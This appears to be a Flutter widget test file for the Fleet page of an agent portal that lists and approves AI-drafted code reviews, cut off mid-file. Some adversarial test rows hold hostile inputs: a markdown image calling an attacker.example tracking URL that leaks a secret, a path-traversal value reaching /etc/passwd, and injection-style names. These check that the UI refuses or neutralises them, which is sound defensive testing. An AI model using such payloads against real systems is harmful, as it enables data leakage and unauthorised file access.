import 'package:agent_portal/src/auth/capabilities.dart';
import 'package:agent_portal/src/gen/agent/v1/forge_registry.pb.dart';
import 'package:agent_portal/src/gen/agent/v1/review_fleet.pb.dart';
import 'package:fixnum/fixnum.dart';
import 'package:flutter/widgets.dart' show SizedBox;
import 'package:flutter_test/flutter_test.dart';
import 'package:grpc/grpc.dart';

import '../testkit/robots/fleet_robot.dart';
import 'fleet_spec.dart';

/// Layer-A widget tests for the Fleet page — iterates [fleetSpec]; each row is one
/// test. Covers the four list-load async states + a bare-gateway UNIMPLEMENTED
/// row, the filter bar, the sessions strip (Review-now dialog + enable toggle),
/// the detail pane (GetReview load / NotFound-unavailable / error-retry), the
/// edit/save flow with its dirty + locked gates, and the two mandatory
/// adversarial rows (exactly-one Approve on a double-click; inert remote image).
/// Each row arranges the fake, drives the page via its robot, then asserts the
/// recorded RPC (method + decoded request) and the widget outcome.
void main() {
  const listRpc = 'agent.v1.ReviewFleetService/ListReviews';
  const rosterRpc = 'agent.v1.ReviewFleetService/List';
  const getRpc = 'agent.v1.ReviewFleetService/GetReview';
  const approveRpc = 'agent.v1.ReviewFleetService/Approve';
  const skipRpc = 'agent.v1.ReviewFleetService/SkipReview';
  const updateRpc = 'agent.v1.ReviewFleetService/UpdateReview';
  const reviewNowRpc = 'agent.v1.ReviewFleetService/ReviewNow';
  const setEnabledRpc = 'agent.v1.ReviewFleetService/SetEnabled';
  const putRpc = FleetRobot.put;
  const deleteRpc = FleetRobot.delete;

  ReviewSummary summary({
    String id = 'r1',
    String repo = 'owner__name',
    int pr = 7,
    String status = 'drafted',
    double risk = 0.42,
    int findings = 3,
    String approvedBy = '',
  }) =>
      ReviewSummary(
        approvedBy: approvedBy,
        reviewId: id,
        repo: repo,
        prNumber: Int64(pr),
        status: status,
        riskScore: risk,
        nFindings: findings,
        filesChanged: 2,
        additions: 10,
        deletions: 1,
      );

  FleetSession session({
    String id = 's1',
    String repo = 'owner__name',
    bool enabled = false,
  }) =>
      FleetSession(id: id, repo: repo, enabled: enabled);

  ForgeCard card(String id,
          {String kind = 'github',
          String encoding = 'owner_name',
          bool enabled = true}) =>
      ForgeCard(
          id: id,
          kind: kind,
          enabled: enabled,
          tokenRef: 'ghapp:42',
          repoEncoding: encoding);
  ForgeList cards(List<ForgeCard> cs) => ForgeList(forges: cs);

  ListReviewsReply reviews(List<ReviewSummary> rs) =>
      ListReviewsReply(reviews: rs);
  FleetSessionList roster(List<FleetSession> ss) => FleetSessionList(sessions: ss);
  GetReviewReply body(String b, {bool truncated = false}) =>
      GetReviewReply(body: b, truncated: truncated);

  for (final row in fleetSpec.rows) {
    testWidgets('fleet ${row.label} — ${row.description}', (tester) async {
      final robot = await FleetRobot.create(tester);
      final fake = robot.fleet;
      FleetSession lastPut() => robot.log.last(putRpc)!.request as FleetSession;
      // Load with [ss] on the roster and [cs] as the forge cards, sessions open.
      Future<void> loadRoster(List<FleetSession> ss,
          {List<ForgeCard>? cs, Capabilities? caps}) async {
        fake.sessionListResponse = roster(ss);
        robot.forges.listResponse = cards(cs ?? [card('github-42')]);
        caps == null ? await robot.load() : await robot.loadWith(caps);
        await robot.expandSessions();
      }

      switch (row.label) {
        // ── list load: four async states + bare-gateway UNIMPLEMENTED ─────────
        case 'positive_loaded_lists_reviews':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.sessionListResponse = roster([session()]);
          await robot.load();
          expect(robot.isListLoaded, isTrue);
          expect(robot.reviewItemCount, greaterThanOrEqualTo(1));
          expect(robot.log.fired(listRpc), isTrue);
          expect(robot.log.fired(rosterRpc), isTrue);
          await robot.settle();

        case 'boundary_empty_list_no_items':
          fake.listReviewsResponse = reviews([]);
          await robot.load();
          expect(robot.isListLoaded, isTrue);
          expect(robot.reviewItemCount, 0);
          expect(robot.textShown('No review drafts match.'), isTrue);
          await robot.settle();

        case 'corner_loading_shows_spinner':
          fake.listReviewsResponse = reviews([summary()]);
          fake.responseDelay = const Duration(milliseconds: 200);
          await robot.pumpLoading();
          expect(robot.showsSpinner, isTrue);
          expect(robot.isListLoaded, isFalse);
          await robot.pumpUntil(() => robot.isListLoaded, reason: 'drain load');
          await robot.settle();

        case 'negative_list_error_shows_retry':
          fake.failNext('ListReviews', const GrpcError.unavailable('down'));
          await robot.load();
          expect(robot.isError, isTrue);
          await robot.settle();

        case 'negative_unimplemented_not_connected':
          fake.failNext('ListReviews'); // default UNIMPLEMENTED
          await robot.load();
          expect(robot.isError, isTrue);
          expect(robot.textShown('Not connected to the fleet'), isTrue);
          await robot.settle();

        case 'positive_retry_recovers':
          fake.failNext('ListReviews', const GrpcError.unavailable('down'));
          await robot.load();
          expect(robot.isError, isTrue);
          fake.listReviewsResponse = reviews([summary()]);
          await robot.tapRetry();
          expect(robot.isListLoaded, isTrue);
          await robot.settle();

        // ── filter bar ─────────────────────────────────────────────────────────
        case 'positive_filter_by_repo':
          fake.listReviewsResponse =
              reviews([summary(id: 'r1', repo: 'acme__widgets')]);
          await robot.load();
          await robot.selectRepo('acme/widgets');
          final call = robot.log.last(listRpc);
          expect((call!.request as ListReviewsRequest).repo, 'acme__widgets');
          await robot.settle();

        case 'corner_repo_menu_from_roster_and_drafts':
          fake.listReviewsResponse = reviews([
            summary(id: 'r1', repo: 'randomizedcoder__xtcp2'),
            summary(id: 'r2', repo: 'randomizedcoder__xtcp2'),
          ]);
          fake.sessionListResponse =
              roster([session(repo: 'NixOS__nixpkgs')]);
          await robot.load();
          await robot.openRepoMenu();
          for (final label in [
            'all repos',
            'NixOS/nixpkgs',
            'randomizedcoder/xtcp2'
          ]) {
            expect(find.text(label, skipOffstage: false).hitTestable(),
                findsWidgets,
                reason: label);
          }
          expect(robot.textShown('randomizedcoder__xtcp2'), isTrue,
              reason: 'the list rows still show the stored key');
          await robot.pickRepo('NixOS/nixpkgs');
          await robot.settle();

        case 'boundary_all_repos_clears_filter':
          fake.listReviewsResponse =
              reviews([summary(id: 'r1', repo: 'acme__widgets')]);
          await robot.load();
          await robot.selectRepo('acme/widgets');
          await robot.selectRepo('all repos');
          final call = robot.log.last(listRpc);
          expect((call!.request as ListReviewsRequest).repo, '');
          await robot.settle();

        case 'adversarial_hostile_repo_name_is_text':
          const hostile = '<img src=x>\u202e__\nevil';
          fake.listReviewsResponse = reviews([summary(id: 'r1', repo: hostile)]);
          await robot.load();
          await robot.selectRepo('<img src=x>\u202e/\nevil');
          final call = robot.log.last(listRpc);
          expect((call!.request as ListReviewsRequest).repo, hostile);
          await robot.settle();

        case 'positive_filter_by_status':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          await robot.selectStatus('approved');
          final call = robot.log.last(listRpc);
          expect((call!.request as ListReviewsRequest).status, 'approved');
          await robot.settle();

        case 'boundary_default_hides_skipped':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          final req = robot.log.last(listRpc)!.request as ListReviewsRequest;
          expect(req.status, '');
          expect(req.excludeStatus, ['skipped']);
          await robot.settle();

        case 'positive_show_skipped':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          await robot.selectStatus('skipped');
          final req = robot.log.last(listRpc)!.request as ListReviewsRequest;
          expect(req.status, 'skipped');
          expect(req.excludeStatus, isEmpty);
          await robot.settle();

        case 'corner_all_includes_skipped':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          await robot.selectStatus('all');
          final req = robot.log.last(listRpc)!.request as ListReviewsRequest;
          expect(req.status, '');
          expect(req.excludeStatus, isEmpty);
          await robot.settle();

        case 'positive_refresh_relists':
          fake.listReviewsResponse = reviews([summary()]);
          await robot.load();
          await robot.tapRefresh();
          expect(robot.log.countOf(listRpc), greaterThanOrEqualTo(2));
          await robot.settle();

        // ── sessions strip ──────────────────────────────────────────────────────
        case 'positive_review_now_opens_dialog':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          expect(robot.exists('fleet.reviewNow.prNumber'), isTrue);
          await robot.cancelReviewNow();
          await robot.settle();

        case 'positive_review_now_queues':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          fake.reviewNowResponse = ReviewNowReply()..accepted = true;
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.queueReviewNow('42');
          final call = robot.log.last(reviewNowRpc);
          final req = call!.request as ReviewNowRequest;
          expect(req.sessionId, 's1');
          expect(req.prNumber.toInt(), 42);
          await robot.settle();

        case 'positive_review_now_pr_field_sent':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          fake.reviewNowResponse = ReviewNowReply()..accepted = true;
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.queueReviewNow('123');
          final call = robot.log.last(reviewNowRpc);
          expect((call!.request as ReviewNowRequest).prNumber.toInt(), 123);
          await robot.settle();

        case 'positive_review_now_cancel_no_rpc':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.cancelReviewNow();
          expect(robot.exists('fleet.reviewNow.prNumber'), isFalse);
          expect(robot.log.fired(reviewNowRpc), isFalse);
          await robot.settle();

        case 'adversarial_review_now_non_numeric_no_rpc':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          await robot.load();
          await robot.expandSessions();
          await robot.openReviewNow('s1');
          await robot.queueReviewNow('not-a-number');
          expect(robot.log.fired(reviewNowRpc), isFalse);
          await robot.settle();

        case 'positive_toggle_enable':
          fake.listReviewsResponse = reviews([]);
          fake.sessionListResponse = roster([session(id: 's1', enabled: false)]);
          fake.setEnabledResponse = FleetSession()
            ..id = 's1'
            ..enabled = true;
          await robot.load();
          await robot.expandSessions();
          await robot.toggleEnable('s1');
          final call = robot.log.last(setEnabledRpc);
          final req = call!.request as FleetSetEnabledRequest;
          expect(req.id, 's1');
          expect(req.enabled, isTrue);
          await robot.settle();

        // ── detail pane ──────────────────────────────────────────────────────────
        case 'positive_attribution_shown':
          fake.listReviewsResponse = reviews([
            summary(id: 'r1')
              ..requestedBy.addAll(['example.com/user:google/alice'])
              ..approvedBy = 'example.com/user:google/bob'
          ]);
          fake.getReviewResponse = body('# Draft body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.exists('fleet.detail.attribution'), isTrue);
          expect(
              robot.textShown('requested by example.com/user:google/alice · '
                  'approved by example.com/user:google/bob'),
              isTrue);
          await robot.settle();

        case 'corner_poller_review_has_no_attribution':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Draft body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailLoaded, isTrue);
          expect(robot.exists('fleet.detail.attribution'), isFalse);
          await robot.settle();

        case 'adversarial_eight_long_requesters_clipped':
          fake.listReviewsResponse = reviews([
            summary(id: 'r1')
              ..requestedBy.addAll([for (var i = 0; i < 8; i++) 't/${'x' * 298}$i'])
          ]);
          fake.getReviewResponse = body('# Draft body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.exists('fleet.detail.attribution'), isTrue);
          expect(tester.takeException(), isNull);
          await robot.settle();

        case 'positive_select_loads_detail':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Draft body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailLoaded, isTrue);
          final call = robot.log.last(getRpc);
          expect((call!.request as GetReviewRequest).reviewId, 'r1');
          await robot.settle();

        case 'corner_unavailable_body':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.failNext('GetReview', const GrpcError.notFound('no body here'));
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailUnavailable, isTrue);
          expect(robot.buttonEnabled('fleet.detail.approve'), isFalse);
          expect(robot.exists('fleet.detail.mode'), isFalse);
          await robot.settle();

        case 'negative_detail_error_shows_retry':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.failNext('GetReview', const GrpcError.unavailable('down'));
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailError, isTrue);
          await robot.settle();

        case 'positive_detail_retry_recovers':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.failNext('GetReview', const GrpcError.unavailable('down'));
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailError, isTrue);
          fake.getReviewResponse = body('# Recovered');
          await robot.tapDetailRetry();
          expect(robot.detailLoaded, isTrue);
          await robot.settle();

        case 'positive_switch_to_edit':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          expect(robot.exists('fleet.detail.editor'), isTrue);
          await robot.settle();

        case 'boundary_locked_disables_edit':
          fake.listReviewsResponse =
              reviews([summary(id: 'r1', status: 'posted')]);
          fake.getReviewResponse = body('# Posted body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.segmentEnabled('Edit'), isFalse);
          expect(robot.segmentEnabled('Preview'), isFalse);
          expect(robot.segmentEnabled('View'), isTrue);
          expect(robot.textShown('read-only'), isTrue);
          expect(robot.exists('fleet.detail.editor'), isFalse);
          await robot.settle();

        case 'positive_edit_updates_field':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('orig');
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          await robot.editBody('edited body');
          expect(find.text('edited body').evaluate().isNotEmpty, isTrue);
          expect(robot.buttonEnabled('fleet.detail.save'), isTrue);
          await robot.settle();

        case 'positive_save_updates_review':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('orig');
          fake.updateReviewResponse = UpdateReviewReply()..status = 'updated';
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          await robot.editBody('new body');
          await robot.save();
          final call = robot.log.last(updateRpc);
          final req = call!.request as UpdateReviewRequest;
          expect(req.reviewId, 'r1');
          expect(req.body, 'new body');
          await robot.settle();

        case 'boundary_save_disabled_unless_dirty':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('body');
          await robot.load();
          await robot.selectReview('r1');
          await robot.selectMode('Edit');
          expect(robot.buttonEnabled('fleet.detail.save'), isFalse);
          await robot.editBody('body changed');
          expect(robot.buttonEnabled('fleet.detail.save'), isTrue);
          await robot.settle();

        // ── approve ────────────────────────────────────────────────────────────
        case 'positive_approve_posts':
          fake.listReviewsResponse = reviews([summary(id: 'r1', pr: 7)]);
          fake.getReviewResponse = body('# Body');
          fake.approveResponse = ApproveReply()
            ..status = 'posted'
            ..detail = 'http://forge/pr/7#c1';
          await robot.load();
          await robot.selectReview('r1');
          await robot.openApprove();
          expect(robot.exists('fleet.approve.confirm'), isTrue);
          await robot.confirmApprove();
          await robot.pumpUntil(() => robot.textShown('Posted'),
              reason: 'posted snack');
          final call = robot.log.last(approveRpc);
          expect((call!.request as ApproveRequest).reviewId, 'r1');
          await robot.settle();

        case 'positive_confirm_fires_approve':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          fake.approveResponse = ApproveReply()..status = 'posted';
          await robot.load();
          await robot.selectReview('r1');
          await robot.openApprove();
          await robot.confirmApprove();
          expect(robot.log.fired(approveRpc), isTrue);
          await robot.settle();

        case 'positive_approve_cancel_no_rpc':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          await robot.openApprove();
          await robot.cancelApprove();
          expect(robot.exists('fleet.approve.confirm'), isFalse);
          expect(robot.log.fired(approveRpc), isFalse);
          await robot.settle();

        case 'boundary_approve_gated_when_dirty':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.buttonEnabled('fleet.detail.approve'), isTrue);
          await robot.selectMode('Edit');
          await robot.editBody('dirty change');
          expect(robot.buttonEnabled('fleet.detail.approve'), isFalse);
          await robot.settle();

        case 'adversarial_double_click_one_approve':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          fake.approveResponse = ApproveReply()..status = 'posted';
          await robot.load();
          await robot.selectReview('r1');
          fake.responseDelay = const Duration(milliseconds: 200); // hold in flight
          await robot.openApprove();
          await robot.doubleConfirmApprove();
          expect(robot.log.countOf(approveRpc), 1);
          fake.responseDelay = Duration.zero;
          await robot.unmountAndSettle();

        case 'adversarial_remote_image_is_inert':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body(
              '![tracker](http://attacker.example/track.png?leak=secret)');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.detailLoaded, isTrue);
          expect(robot.textShown('image not loaded'), isTrue);
          await robot.settle();

        case 'adversarial_review_viewer_sees_no_approve_button':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.sessionListResponse = roster([session(id: 's1')]);
          fake.getReviewResponse = body('# Body');
          await robot.loadWith(
              Capabilities.of(const ['read:review', 'read:fleet']));
          await robot.selectReview('r1');
          expect(robot.detailLoaded, isTrue);
          expect(robot.exists('fleet.detail.approve'), isFalse);
          expect(robot.textShown('read-only'), isTrue);
          await robot.expandSessions();
          expect(robot.exists('fleet.session.reviewNow.s1'), isFalse);
          expect(robot.switchEnabled('fleet.session.enable.s1'), isFalse);
          expect(robot.log.fired(approveRpc), isFalse);
          await robot.settle();

        // ── skip ───────────────────────────────────────────────────────────────
        case 'positive_skip_marks_skipped':
          fake.listReviewsResponse = reviews([summary(id: 'r1', pr: 7)]);
          fake.getReviewResponse = body('# Body');
          fake.skipReviewResponse = SkipReviewReply()..status = 'skipped';
          await robot.load();
          await robot.selectReview('r1');
          final lists = robot.log.countOf(listRpc);
          await robot.openSkip();
          expect(robot.exists('fleet.skip.confirm'), isTrue);
          await robot.confirmSkip();
          await robot.pumpUntil(() => robot.textShown('Skipped PR #7'),
              reason: 'skipped snack');
          final call = robot.log.last(skipRpc);
          expect((call!.request as SkipReviewRequest).reviewId, 'r1');
          await robot.pumpUntil(() => robot.log.countOf(listRpc) > lists,
              reason: 're-list after skip');
          expect(robot.log.fired(approveRpc), isFalse);
          await robot.settle();

        case 'positive_confirm_fires_skip':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          fake.skipReviewResponse = SkipReviewReply()..status = 'skipped';
          await robot.load();
          await robot.selectReview('r1');
          await robot.openSkip();
          await robot.confirmSkip();
          expect(robot.log.fired(skipRpc), isTrue);
          await robot.settle();

        case 'positive_skip_cancel_no_rpc':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          await robot.openSkip();
          await robot.cancelSkip();
          expect(robot.exists('fleet.skip.confirm'), isFalse);
          expect(robot.log.fired(skipRpc), isFalse);
          await robot.settle();

        case 'corner_skipped_draft_is_final':
          fake.listReviewsResponse = reviews([
            summary(
                id: 'r1',
                status: 'skipped',
                approvedBy: 'example.com/user:google/bob')
          ]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.exists('fleet.detail.skip'), isFalse);
          expect(robot.buttonEnabled('fleet.detail.approve'), isFalse);
          expect(robot.textShown('skipped by example.com/user:google/bob'),
              isTrue);
          await robot.settle();

        case 'boundary_posted_draft_has_no_skip':
          fake.listReviewsResponse =
              reviews([summary(id: 'r1', status: 'posted')]);
          fake.getReviewResponse = body('# Body');
          await robot.load();
          await robot.selectReview('r1');
          expect(robot.exists('fleet.detail.skip'), isFalse);
          await robot.settle();

        case 'negative_skip_lost_race_to_post':
          fake.listReviewsResponse = reviews([summary(id: 'r1', pr: 7)]);
          fake.getReviewResponse = body('# Body');
          fake.skipReviewResponse = SkipReviewReply()..status = 'already_posted';
          await robot.load();
          await robot.selectReview('r1');
          await robot.openSkip();
          await robot.confirmSkip();
          await robot.pumpUntil(() => robot.textShown('Already posted'),
              reason: 'already-posted snack');
          expect(robot.textShown('Skipped PR #7'), isFalse);
          await robot.settle();

        case 'negative_skip_error_snack':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          fake.failNext(
              'SkipReview', const GrpcError.permissionDenied('no approve'));
          await robot.load();
          await robot.selectReview('r1');
          await robot.openSkip();
          await robot.confirmSkip();
          await robot.pumpUntil(() => robot.textShown('Skip failed'),
              reason: 'error snack');
          expect(robot.isListLoaded, isTrue);
          await robot.settle();

        case 'adversarial_double_click_one_skip':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          fake.skipReviewResponse = SkipReviewReply()..status = 'skipped';
          await robot.load();
          await robot.selectReview('r1');
          fake.responseDelay = const Duration(milliseconds: 200);
          await robot.openSkip();
          await robot.doubleConfirmSkip();
          expect(robot.log.countOf(skipRpc), 1);
          fake.responseDelay = Duration.zero;
          await robot.unmountAndSettle();

        case 'adversarial_review_viewer_sees_no_skip':
          fake.listReviewsResponse = reviews([summary(id: 'r1')]);
          fake.getReviewResponse = body('# Body');
          await robot.loadWith(
              Capabilities.of(const ['read:review', 'read:fleet']));
          await robot.selectReview('r1');
          expect(robot.detailLoaded, isTrue);
          expect(robot.exists('fleet.detail.skip'), isFalse);
          expect(robot.log.fired(skipRpc), isFalse);
          await robot.settle();

        // ── session editor (forge-auth F5d2) ──────────────────────────────────
        case 'positive_row_shows_forge_card':
          await loadRoster([session()..forgeId = 'github-42']);
          expect(robot.exists('fleet.session.item.s1'), isTrue);
          expect(robot.textShown('owner__name · github-42'), isTrue);
          expect(robot.log.fired('agent.v1.ForgeRegistryService/List'), isTrue);
          await robot.settle();

        case 'positive_new_opens_editor':
          await loadRoster([], cs: [card('a-off', enabled: false), card('b-on')]);
          await robot.openSessionDialog('fleet.session.new');
          expect(robot.sessionDialogOpen, isTrue);
          expect(robot.textShown('b-on · github'), isTrue,
              reason: 'first enabled card preselected');
          expect(robot.log.fired(putRpc), isFalse);
          await robot.cancelSession();
          await robot.settle();

        case 'positive_create_puts_card_session':
          await loadRoster([]);
          final listsBefore = robot.log.countOf(rosterRpc);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'widgets', repo: 'acme/widgets');
          await robot.saveSession();
          final put = lastPut();
          expect(put.id, 'widgets');
          expect(put.forgeId, 'github-42');
          expect(put.repo, 'acme__widgets');
          expect(put.user, 'acme');
          expect(put.enabled, isFalse);
          expect(put.pollSecs.toInt(), 0);
          expect((put.backend, put.baseUrl, put.tokenRef), ('', '', ''));
          expect(robot.sessionDialogOpen, isFalse);
          await robot.pumpUntil(() => robot.log.countOf(rosterRpc) > listsBefore,
              reason: 'roster re-listed');
          await robot.settle();

        case 'positive_pick_path_card':
          await loadRoster([],
              cs: [card('github-42'), card('gl-1', kind: 'gitlab', encoding: 'path')]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.pickForge('gl-1');
          await robot.fillSession(id: 'proj', repo: 'grp/sub/proj');
          await robot.saveSession();
          expect(lastPut().forgeId, 'gl-1');
          expect(lastPut().repo, 'grp__sub__proj');
          expect(lastPut().user, 'grp');
          await robot.settle();

        case 'boundary_no_cards_points_to_forges':
          await loadRoster([], cs: []);
          await robot.openSessionDialog('fleet.session.new');
          expect(robot.textShown('create one on the Forges tab'), isTrue);
          await robot.fillSession(id: 'x', repo: 'acme/x');
          await robot.saveSession(expectPut: false);
          expect(robot.sessionDialogError, 'Choose a forge card.');
          expect(robot.log.fired(putRpc), isFalse);
          await robot.cancelSession();
          await robot.settle();

        case 'negative_cards_unavailable_blocks_create':
          robot.forges.listError = const GrpcError.permissionDenied('no read:forge_registry');
          await loadRoster([]);
          expect(robot.isListLoaded, isTrue, reason: 'the page still loads');
          await robot.openSessionDialog('fleet.session.new');
          expect(robot.textShown('could not be listed'), isTrue);
          await robot.fillSession(id: 'x', repo: 'acme/x');
          await robot.saveSession(expectPut: false);
          expect(robot.sessionDialogOpen, isTrue);
          expect(robot.log.fired(putRpc), isFalse);
          await robot.cancelSession();
          await robot.settle();

        case 'positive_encoded_slug_accepted':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'my.org__a-b');
          await robot.saveSession();
          expect(lastPut().repo, 'my.org__a-b');
          expect(lastPut().user, 'my.org');
          await robot.settle();

        case 'adversarial_hostile_repo_refused':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w');
          for (final bad in [
            '../../etc/passwd',
            'acme/../x',
            'acme',
            'acme/',
            '/acme/x',
            'acme/-rf',
            'a b/c',
            'acme\\x',
            'acme/x?y',
            'ａcme/x',
            'a' * 70 + '/' + 'b' * 70,
          ]) {
            await robot.fillSession(repo: bad);
            await robot.saveSession(expectPut: false);
            expect(robot.sessionDialogOpen, isTrue, reason: bad);
            expect(robot.sessionDialogError, startsWith('Repository'), reason: bad);
          }
          expect(robot.log.fired(putRpc), isFalse);
          await robot.cancelSession();
          await robot.settle();

        case 'positive_id_sent':
          await loadRoster([session(id: 'other')]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: '  acme_gh.v2  ', repo: 'acme/w');
          await robot.saveSession();
          expect(lastPut().id, 'acme_gh.v2');
          await robot.settle();

        case 'boundary_id_max_len':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'a' * 129, repo: 'acme/w');
          await robot.saveSession(expectPut: false);
          expect(robot.sessionDialogError, startsWith('Session id'));
          await robot.fillSession(id: 'a' * 128);
          await robot.saveSession();
          expect(lastPut().id.length, 128);
          await robot.settle();

        case 'adversarial_hostile_id_refused':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(repo: 'acme/w');
          for (final bad in ['', '..', '../x', 'a/b', '-rf', '.git', 'a..b', 'ïd', 'a\tb', 'a b']) {
            await robot.fillSession(id: bad);
            await robot.saveSession(expectPut: false);
            expect(robot.sessionDialogError, startsWith('Session id'), reason: bad);
          }
          expect(robot.log.fired(putRpc), isFalse);
          await robot.cancelSession();
          await robot.settle();

        case 'negative_duplicate_id_refused':
          await loadRoster([session(id: 's1')]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 's1', repo: 'acme/w');
          await robot.saveSession(expectPut: false);
          expect(robot.sessionDialogError, 'A session "s1" already exists.');
          expect(robot.log.fired(putRpc), isFalse);
          await robot.cancelSession();
          await robot.settle();

        case 'positive_explicit_user_sent':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w', user: 'reviewers');
          await robot.saveSession();
          expect(lastPut().user, 'reviewers');
          await robot.settle();

        case 'corner_signed_in_tenant_owns_session':
          robot.forges.listResponse = cards([card('github-42')]);
          await robot.loadWith(Capabilities.all, tenant: 'example.com');
          await robot.expandSessions();
          await robot.openSessionDialog('fleet.session.new');
          final userField = tester.widget(robot.byKey('fleet.session.dialog.user')) as dynamic;
          expect(userField.enabled, isFalse);
          expect(robot.textShown('Your tenant'), isTrue);
          await robot.fillSession(id: 'w', repo: 'acme/w');
          await robot.saveSession();
          expect(lastPut().user, 'example.com');
          await robot.settle();

        case 'adversarial_edit_cannot_move_tenant':
          await loadRoster([FleetSession(id: 's1', user: 'tenant-a', repo: 'acme__w', forgeId: 'github-42')]);
          await robot.openSessionDialog('fleet.session.edit.s1');
          final userField = tester.widget(robot.byKey('fleet.session.dialog.user')) as dynamic;
          expect(userField.enabled, isFalse);
          await robot.saveSession();
          expect(lastPut().user, 'tenant-a');
          await robot.settle();

        case 'positive_skill_sent':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w', skill: 'review-security');
          await robot.saveSession();
          expect(lastPut().skill, 'review-security');
          await robot.settle();

        case 'adversarial_control_chars_refused':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w');
          for (final bad in ['a\tb', 'a\u0000b', 'a\u007fb', 'é' * 129]) {
            await robot.fillSession(skill: bad);
            await robot.saveSession(expectPut: false);
            expect(robot.sessionDialogError, startsWith('Skill'), reason: bad);
          }
          expect(robot.log.fired(putRpc), isFalse);
          await robot.cancelSession();
          await robot.settle();

        case 'positive_poll_sent':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w', poll: '600');
          await robot.saveSession();
          expect(lastPut().pollSecs.toInt(), 600);
          await robot.settle();

        case 'boundary_poll_bounds':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w');
          for (final bad in ['29', '86401', '-30', '1e3', '9999999999999999999999']) {
            await robot.fillSession(poll: bad);
            await robot.saveSession(expectPut: false);
            expect(robot.sessionDialogError, startsWith('Poll interval'), reason: bad);
          }
          expect(robot.log.fired(putRpc), isFalse);
          await robot.fillSession(poll: '30');
          await robot.saveSession();
          expect(lastPut().pollSecs.toInt(), 30);
          await robot.settle();

        case 'positive_enabled_sent':
          await loadRoster([]);
          await robot.openSessionDialog('fleet.session.new');
          await robot.fillSession(id: 'w', repo: 'acme/w');
          await robot.toggleSessionEnabled();
          await robot.saveSession();
          expect(lastPut().enabled, isTrue);
          await robot.settle();

        case 'positive_error_keeps_dialog':
